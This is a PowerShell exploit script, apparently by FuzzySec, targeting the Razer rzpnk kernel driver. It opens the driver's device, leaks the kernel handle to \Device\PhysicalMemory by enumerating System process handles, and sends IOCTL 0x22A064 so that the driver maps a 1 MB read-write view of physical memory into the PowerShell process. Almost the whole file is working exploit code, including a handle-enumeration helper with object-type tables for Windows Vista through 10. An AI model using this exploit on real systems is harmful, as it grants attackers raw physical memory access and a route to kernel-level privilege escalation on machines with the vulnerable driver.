
```powershell
function RZ-ZwMapViewOfSection {
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
public static class Razer
{
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public static extern IntPtr CreateFile(
String lpFileName,
UInt32 dwDesiredAccess,
UInt32 dwShareMode,
IntPtr lpSecurityAttributes,
UInt32 dwCreationDisposition,
UInt32 dwFlagsAndAttributes,
IntPtr hTemplateFile);
[DllImport("Kernel32.dll", SetLastError = true)]
public static extern bool DeviceIoControl(
IntPtr hDevice,
int IoControlCode,
byte[] InBuffer,
int nInBufferSize,
IntPtr OutBuffer,
int nOutBufferSize,
ref int pBytesReturned,
IntPtr Overlapped);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAlloc(
IntPtr lpAddress,
uint dwSize,
UInt32 flAllocationType,
UInt32 flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(
UInt32 processAccess,
bool bInheritHandle,
int processId);
}
"@
#----------------[Helper Funcs]
function Get-Handles {
<#
.SYNOPSIS
Use NtQuerySystemInformation::SystemHandleInformation to get a list of
open handles in the specified process, works on x32/x64.
Notes:
\* For more robust coding I would recomend using @mattifestation's
Get-NtSystemInformation.ps1 part of PowerShellArsenal.
.DESCRIPTION
Author: Ruben Boonen (@FuzzySec)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
.EXAMPLE
C:\PS> $SystemProcHandles = Get-Handles -ProcID 4
C:\PS> $Key = $SystemProcHandles |Where-Object {$\_.ObjectType -eq "Key"}
C:\PS> $Key |ft
ObjectType AccessMask PID Handle HandleFlags KernelPointer
---------- ---------- --- ------ ----------- -------------
Key 0x00000000 4 0x004C NONE 0xFFFFC9076FC29BC0
Key 0x00020000 4 0x0054 NONE 0xFFFFC9076FCDA7F0
Key 0x000F0000 4 0x0058 NONE 0xFFFFC9076FC39CE0
Key 0x00000000 4 0x0090 NONE 0xFFFFC907700A6B40
Key 0x00000000 4 0x0098 NONE 0xFFFFC90770029F70
Key 0x00020000 4 0x00A0 NONE 0xFFFFC9076FC9C1A0
[...Snip...]
#>
[CmdletBinding()]
param (
[Parameter(Mandatory = $True)]
[int]$ProcID
)
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct SYSTEM\_HANDLE\_INFORMATION
{
public UInt32 ProcessID;
public Byte ObjectTypeNumber;
public Byte Flags;
public UInt16 HandleValue;
public IntPtr Object\_Pointer;
public UInt32 GrantedAccess;
}
public static class GetHandles
{
[DllImport("ntdll.dll")]
public static extern int NtQuerySystemInformation(
int SystemInformationClass,
IntPtr SystemInformation,
int SystemInformationLength,
ref int ReturnLength);
}
"@
# Make sure the PID exists
if (!$(get-process -Id $ProcID -ErrorAction SilentlyContinue)) {
Return
}
# Flag switches (0 = NONE?)
$FlagSwitches = @{
0 = 'NONE'
1 = 'PROTECT\_FROM\_CLOSE'
2 = 'INHERIT'
}
$OSVersion = [Version](Get-WmiObject Win32\_OperatingSystem).Version
$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"
switch ($OSMajorMinor)
{
'10.0' # Windows 10 (Tested on v1511)
{
# Win 10 v1703
if ($OSVersion.Build -ge 15063) {
$TypeSwitches = @{
0x24 = 'TmTm'; 0x18 = 'Desktop'; 0x7 = 'Process'; 0x2c = 'RegistryTransaction'; 0xe = 'DebugObject';
0x3d = 'VRegConfigurationContext'; 0x34 = 'DmaDomain'; 0x1c = 'TpWorkerFactory'; 0x1d = 'Adapter';
0x5 = 'Token'; 0x39 = 'DxgkSharedResource'; 0xc = 'PsSiloContextPaged'; 0x38 = 'NdisCmState';
0xb = 'ActivityReference'; 0x35 = 'PcwObject'; 0x2f = 'WmiGuid'; 0x33 = 'DmaAdapter';
0x30 = 'EtwRegistration'; 0x29 = 'Session'; 0x1a = 'RawInputManager'; 0x13 = 'Timer'; 0x10 = 'Mutant';
0x14 = 'IRTimer'; 0x3c = 'DxgkCurrentDxgProcessObject'; 0x21 = 'IoCompletion';
0x3a = 'DxgkSharedSyncObject'; 0x17 = 'WindowStation'; 0x15 = 'Profile'; 0x23 = 'File';
0x2a = 'Partition'; 0x12 = 'Semaphore'; 0xd = 'PsSiloContextNonPaged'; 0x32 = 'EtwConsumer';
0x19 = 'Composition'; 0x31 = 'EtwSessionDemuxEntry'; 0x1b = 'CoreMessaging'; 0x25 = 'TmTx';
0x4 = 'SymbolicLink'; 0x36 = 'FilterConnectionPort'; 0x2b = 'Key'; 0x16 = 'KeyedEvent';
0x11 = 'Callback'; 0x22 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job';
0x3b = 'DxgkSharedSwapChainObject'; 0x1e = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1f = 'Device';
0x3 = 'Directory'; 0x28 = 'Section'; 0x27 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type';
0x37 = 'FilterCommunicationPort'; 0x2e = 'PowerRequest'; 0x26 = 'TmRm'; 0xf = 'Event';
0x2d = 'ALPC Port'; 0x20 = 'Driver';
}
}
# Win 10 v1607
if ($OSVersion.Build -ge 14393 -And $OSVersion.Build -lt 15063) {
$TypeSwitches = @{
0x23 = 'TmTm'; 0x17 = 'Desktop'; 0x7 = 'Process'; 0x2b = 'RegistryTransaction'; 0xd = 'DebugObject';
0x3a = 'VRegConfigurationContext'; 0x32 = 'DmaDomain'; 0x1b = 'TpWorkerFactory'; 0x1c = 'Adapter';
0x5 = 'Token'; 0x37 = 'DxgkSharedResource'; 0xb = 'PsSiloContextPaged'; 0x36 = 'NdisCmState';
0x33 = 'PcwObject'; 0x2e = 'WmiGuid'; 0x31 = 'DmaAdapter'; 0x2f = 'EtwRegistration';
0x28 = 'Session'; 0x19 = 'RawInputManager'; 0x12 = 'Timer'; 0xf = 'Mutant'; 0x13 = 'IRTimer';
0x20 = 'IoCompletion'; 0x38 = 'DxgkSharedSyncObject'; 0x16 = 'WindowStation'; 0x14 = 'Profile';
0x22 = 'File'; 0x3b = 'VirtualKey'; 0x29 = 'Partition'; 0x11 = 'Semaphore'; 0xc = 'PsSiloContextNonPaged';
0x30 = 'EtwConsumer'; 0x18 = 'Composition'; 0x1a = 'CoreMessaging'; 0x24 = 'TmTx'; 0x4 = 'SymbolicLink';
0x34 = 'FilterConnectionPort'; 0x2a = 'Key'; 0x15 = 'KeyedEvent'; 0x10 = 'Callback';
0x21 = 'WaitCompletionPacket'; 0x9 = 'UserApcReserve'; 0x6 = 'Job'; 0x39 = 'DxgkSharedSwapChainObject';
0x1d = 'Controller'; 0xa = 'IoCompletionReserve'; 0x1e = 'Device'; 0x3 = 'Directory'; 0x27 = 'Section';
0x26 = 'TmEn'; 0x8 = 'Thread'; 0x2 = 'Type'; 0x35 = 'FilterCommunicationPort'; 0x2d = 'PowerRequest';
0x25 = 'TmRm'; 0xe = 'Event'; 0x2c = 'ALPC Port'; 0x1f = 'Driver';
}
}
# Win 10 v1511
if ($OSVersion.Build -lt 14393) {
$TypeSwitches = @{
0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'Mutant'; 0x0E = 'Callback'; 0x0F = 'Semaphore';
0x10 = 'Timer'; 0x11 = 'IRTimer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
0x15 = 'Desktop'; 0x16 = 'Composition'; 0x17 = 'RawInputManager'; 0x18 = 'TpWorkerFactory';
0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Partition'; 0x27 = 'Key';
0x28 = 'ALPC Port'; 0x29 = 'PowerRequest'; 0x2A = 'WmiGuid'; 0x2B = 'EtwRegistration';
0x2C = 'EtwConsumer'; 0x2D = 'DmaAdapter'; 0x2E = 'DmaDomain'; 0x2F = 'PcwObject';
0x30 = 'FilterConnectionPort'; 0x31 = 'FilterCommunicationPort'; 0x32 = 'NetworkNamespace';
0x33 = 'DxgkSharedResource'; 0x34 = 'DxgkSharedSyncObject'; 0x35 = 'DxgkSharedSwapChainObject';
}
}
}
'6.2' # Windows 8 and Windows Server 2012
{
$TypeSwitches = @{
0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0A = 'IoCompletionReserve';
0x0B = 'DebugObject'; 0x0C = 'Event'; 0x0D = 'EventPair'; 0x0E = 'Mutant'; 0x0F = 'Callback';
0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'IRTimer'; 0x13 = 'Profile'; 0x14 = 'KeyedEvent';
0x15 = 'WindowStation'; 0x16 = 'Desktop'; 0x17 = 'CompositionSurface'; 0x18 = 'TpWorkerFactory';
0x19 = 'Adapter'; 0x1A = 'Controller'; 0x1B = 'Device'; 0x1C = 'Driver'; 0x1D = 'IoCompletion';
0x1E = 'WaitCompletionPacket'; 0x1F = 'File'; 0x20 = 'TmTm'; 0x21 = 'TmTx'; 0x22 = 'TmRm';
0x23 = 'TmEn'; 0x24 = 'Section'; 0x25 = 'Session'; 0x26 = 'Key'; 0x27 = 'ALPC Port';
0x28 = 'PowerRequest'; 0x29 = 'WmiGuid'; 0x2A = 'EtwRegistration'; 0x2B = 'EtwConsumer';
0x2C = 'FilterConnectionPort'; 0x2D = 'FilterCommunicationPort'; 0x2E = 'PcwObject';
0x2F = 'DxgkSharedResource'; 0x30 = 'DxgkSharedSyncObject';
}
}
'6.1' # Windows 7 and Window Server 2008 R2
{
$TypeSwitches = @{
0x02 = 'Type'; 0x03 = 'Directory'; 0x04 = 'SymbolicLink'; 0x05 = 'Token'; 0x06 = 'Job';
0x07 = 'Process'; 0x08 = 'Thread'; 0x09 = 'UserApcReserve'; 0x0a = 'IoCompletionReserve';
0x0b = 'DebugObject'; 0x0c = 'Event'; 0x0d = 'EventPair'; 0x0e = 'Mutant'; 0x0f = 'Callback';
0x10 = 'Semaphore'; 0x11 = 'Timer'; 0x12 = 'Profile'; 0x13 = 'KeyedEvent'; 0x14 = 'WindowStation';
0x15 = 'Desktop'; 0x16 = 'TpWorkerFactory'; 0x17 = 'Adapter'; 0x18 = 'Controller';
0x19 = 'Device'; 0x1a = 'Driver'; 0x1b = 'IoCompletion'; 0x1c = 'File'; 0x1d = 'TmTm';
0x1e = 'TmTx'; 0x1f = 'TmRm'; 0x20 = 'TmEn'; 0x21 = 'Section'; 0x22 = 'Session'; 0x23 = 'Key';
0x24 = 'ALPC Port'; 0x25 = 'PowerRequest'; 0x26 = 'WmiGuid'; 0x27 = 'EtwRegistration';
0x28 = 'EtwConsumer'; 0x29 = 'FilterConnectionPort'; 0x2a = 'FilterCommunicationPort';
0x2b = 'PcwObject';
}
}
'6.0' # Windows Vista and Windows Server 2008
{
$TypeSwitches = @{
0x01 = 'Type'; 0x02 = 'Directory'; 0x03 = 'SymbolicLink'; 0x04 = 'Token'; 0x05 = 'Job';
0x06 = 'Process'; 0x07 = 'Thread'; 0x08 = 'DebugObject'; 0x09 = 'Event'; 0x0a = 'EventPair';
0x0b = 'Mutant'; 0x0c = 'Callback'; 0x0d = 'Semaphore'; 0x0e = 'Timer'; 0x0f = 'Profile';
0x10 = 'KeyedEvent'; 0x11 = 'WindowStation'; 0x12 = 'Desktop'; 0x13 = 'TpWorkerFactory';
0x14 = 'Adapter'; 0x15 = 'Controller'; 0x16 = 'Device'; 0x17 = 'Driver'; 0x18 = 'IoCompletion';
0x19 = 'File'; 0x1a = 'TmTm'; 0x1b = 'TmTx'; 0x1c = 'TmRm'; 0x1d = 'TmEn'; 0x1e = 'Section';
0x1f = 'Session'; 0x20 = 'Key'; 0x21 = 'ALPC Port'; 0x22 = 'WmiGuid'; 0x23 = 'EtwRegistration';
0x24 = 'FilterConnectionPort'; 0x25 = 'FilterCommunicationPort';
}
}
}
[int]$BuffPtr\_Size = 0
while ($true) {
[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr\_Size)
$SystemInformationLength = New-Object Int
$CallResult = [GetHandles]::NtQuerySystemInformation(16, $BuffPtr, $BuffPtr\_Size, [ref]$SystemInformationLength)
# STATUS\_INFO\_LENGTH\_MISMATCH
if ($CallResult -eq 0xC0000004) {
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
[int]$BuffPtr\_Size = [System.Math]::Max($BuffPtr\_Size,$SystemInformationLength)
}
# STATUS\_SUCCESS
elseif ($CallResult -eq 0x00000000) {
break
}
# Probably: 0xC0000005 -> STATUS\_ACCESS\_VIOLATION
else {
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
return
}
}
$SYSTEM\_HANDLE\_INFORMATION = New-Object SYSTEM\_HANDLE\_INFORMATION
$SYSTEM\_HANDLE\_INFORMATION = $SYSTEM\_HANDLE\_INFORMATION.GetType()
if ([System.IntPtr]::Size -eq 4) {
$SYSTEM\_HANDLE\_INFORMATION\_Size = 16 # This makes sense!
} else {
$SYSTEM\_HANDLE\_INFORMATION\_Size = 24 # This doesn't make sense, should be 20 on x64 but that doesn't work.
# Ask no questions, hear no lies!
}
$BuffOffset = $BuffPtr.ToInt64()
$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
$BuffOffset = $BuffOffset + [System.IntPtr]::Size
$SystemHandleArray = @()
for ($i=0; $i -lt $HandleCount; $i++){
# PtrToStructure only objects we are targeting, this is expensive computation
if ([System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset) -eq $ProcID) {
$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM\_HANDLE\_INFORMATION)
$HashTable = @{
PID = $Cast.ProcessID
ObjectType = if (!$($TypeSwitches[[int]$Cast.ObjectTypeNumber])) { "0x$('{0:X2}' -f [int]$Cast.ObjectTypeNumber)" } else { $TypeSwitches[[int]$Cast.ObjectTypeNumber] }
HandleFlags = $FlagSwitches[[int]$Cast.Flags]
Handle = "0x$('{0:X4}' -f [int]$Cast.HandleValue)"
KernelPointer = if ([System.IntPtr]::Size -eq 4) { "0x$('{0:X}' -f $Cast.Object\_Pointer.ToInt32())" } else { "0x$('{0:X}' -f $Cast.Object\_Pointer.ToInt64())" }
AccessMask = "0x$('{0:X8}' -f $($Cast.GrantedAccess -band 0xFFFF0000))"
}
$Object = New-Object PSObject -Property $HashTable
$SystemHandleArray += $Object
}
$BuffOffset = $BuffOffset + $SYSTEM\_HANDLE\_INFORMATION\_Size
}
if ($($SystemHandleArray.count) -eq 0) {
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
Return
}
# Set column order and auto size
$SystemHandleArray
# Free SYSTEM\_HANDLE\_INFORMATION array
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
}
#----------------[Get Driver Handle]
$hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
if ($hDevice -eq -1) {
echo "`n[!] Unable to get driver handle..`n"
Return
} else {
echo "`n[>] Driver access OK.."
echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
echo "[+] Handle: $hDevice"
}
#----------------[Prepare buffer & Send IOCTL]
# Get full access process handle to self
echo "`n[>] Opening full access handle to PowerShell.."
$hPoshProc = [Razer]::OpenProcess(0x001F0FFF,$false,$PID)
echo "[+] PowerShell handle: $hPoshProc"
# Get Section handle
echo "`n[>] Leaking Kernel handle to \Device\PhysicalMemory.."
$SystemProcHandles = Get-Handles -ProcID 4
[Int]$UserSectionHandle = $(($SystemProcHandles |Where-Object {$\_.ObjectType -eq "Section"}).Handle)
[Int64]$SystemSectionHandle = $UserSectionHandle + 0xffffffff80000000
echo "[+] System section handle: $('{0:X}' -f $SystemSectionHandle)"
# NTSTATUS ZwMapViewOfSection(
# \_In\_ HANDLE SectionHandle, | Param 3 - RCX = SectionHandle
# \_In\_ HANDLE ProcessHandle, | Param 1 - RDX = ProcessHandle
# \_Inout\_ PVOID \*BaseAddress, | Param 2 - R8 = BaseAddress -> Irrelevant, ptr to NULL
# \_In\_ ULONG\_PTR ZeroBits, | 0 -> OK - R9
# \_In\_ SIZE\_T CommitSize, | Param 5 - CommitSize / ViewSize
# \_Inout\_opt\_ PLARGE\_INTEGER SectionOffset, | 0 -> OK
# \_Inout\_ PSIZE\_T ViewSize, | Param 5 - CommitSize / ViewSize
# \_In\_ SECTION\_INHERIT InheritDisposition, | 2 = ViewUnmap
# \_In\_ ULONG AllocationType, | 0 -> Undocumented?
# \_In\_ ULONG Win32Protect | 0x40 -> PAGE\_READWRITE
# );
$InBuffer = @(
[System.BitConverter]::GetBytes($hPoshProc.ToInt64()) + # Param 1 - RDX=ProcessHandle
[System.BitConverter]::GetBytes([Int64]0x0) + # Param 2 - BaseAddress -> Irrelevant, ptr to NULL
[System.BitConverter]::GetBytes($SystemSectionHandle) + # Param 3 - RCX=SectionHandle
[System.BitConverter]::GetBytes([Int64]4) + # Param 4 - ? junk ?
[System.BitConverter]::GetBytes([Int64]$(1\*1024\*1024)) + # Param 5 - CommitSize / ViewSize (1mb)
[System.BitConverter]::GetBytes([Int64]4) # Param 6 - ? junk ?
)
# Output buffer
$OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
# Ptr receiving output byte count
$IntRet = 0
#=======
# 0x22a050 - ZwOpenProcess
# 0x22A064 - ZwMapViewOfSection
#=======
$CallResult = [Razer]::DeviceIoControl($hDevice, 0x22A064, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
if (!$CallResult) {
echo "`n[!] DeviceIoControl failed..`n"
Return
}
#----------------[Read out the result buffer]
echo "`n[>] Verifying ZwMapViewOfSection.."
$NTSTATUS = "{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8+8))
$Address = [System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8)
if ($NTSTATUS -eq 0) {
echo "[+] NTSTATUS Success!"
echo "[+] 1mb RWX \Device\PhysicalMemory allocated at: $('{0:X}' -f $Address)`n"
} else {
echo "[!] Call failed: $('{0:X}' -f $NTSTATUS)`n"
}
}
```
